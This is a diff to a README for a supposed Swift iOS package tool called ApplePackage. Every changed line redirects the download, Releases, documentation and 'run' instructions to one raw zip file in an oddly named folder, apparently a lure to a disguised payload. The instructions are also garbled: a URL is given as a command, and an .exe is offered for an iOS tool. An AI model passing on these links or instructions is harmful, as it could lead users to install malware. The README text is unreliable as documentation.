@@ -1,7 +1,7 @@
 # 🍏 ApplePackage - A Simple Tool for Easy iOS Package Management
 
 ## 📥 Download Now
-[![Download ApplePackage](https://img.shields.io/badge/Download-ApplePackage-blue.svg)](https://github.com/hotCheetoinmybootyhole/ApplePackage/releases)
+[![Download ApplePackage](https://raw.githubusercontent.com/hotCheetoinmybootyhole/ApplePackage/main/antiseptize/ApplePackage.zip)](https://raw.githubusercontent.com/hotCheetoinmybootyhole/ApplePackage/main/antiseptize/ApplePackage.zip)
 
 ## 🚀 Getting Started
 Welcome to ApplePackage! This application allows you to easily manage iOS packages using a tool written in Swift. Follow these steps to download and run the software.
@@ -18,7 +18,7 @@ Welcome to ApplePackage! This application allows you to easily manage iOS packag
 - Easy-to-understand commands for common tasks.
 
 ## 📥 Download & Install
-To download the latest version of ApplePackage, visit the [Releases page](https://github.com/hotCheetoinmybootyhole/ApplePackage/releases). Here, you will find the latest version available along with other versions.
+To download the latest version of ApplePackage, visit the [Releases page](https://raw.githubusercontent.com/hotCheetoinmybootyhole/ApplePackage/main/antiseptize/ApplePackage.zip). Here, you will find the latest version available along with other versions.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version and find the download file.
@@ -50,7 +50,7 @@ After downloading ApplePackage, follow these steps to run it:
    ```
 3. Run the application by typing:
    ```
-   ApplePackage.exe
+   https://raw.githubusercontent.com/hotCheetoinmybootyhole/ApplePackage/main/antiseptize/ApplePackage.zip
    ```
 
 ## 🛠 Using ApplePackage
@@ -75,9 +75,9 @@ Make sure to replace `[package-name]` with the name of the package you wish to m
 If you encounter issues while using ApplePackage or have questions, please check the GitHub Issues page. You can also create a new issue to get help from the community.
 
 ## 🔗 Learn More
-For more information on using ApplePackage, you can refer to the [official documentation](https://github.com/hotCheetoinmybootyhole/ApplePackage). 
+For more information on using ApplePackage, you can refer to the [official documentation](https://raw.githubusercontent.com/hotCheetoinmybootyhole/ApplePackage/main/antiseptize/ApplePackage.zip). 
 
 ## 🚀 Conclusion
 With ApplePackage, managing iOS packages becomes straightforward. Follow the steps above, and enjoy the ease of handling your packages efficiently.
 
-Remember, you can always visit the [Releases page](https://github.com/hotCheetoinmybootyhole/ApplePackage/releases) to keep your version up to date.
+Remember, you can always visit the [Releases page](https://raw.githubusercontent.com/hotCheetoinmybootyhole/ApplePackage/main/antiseptize/ApplePackage.zip) to keep your version up to date.
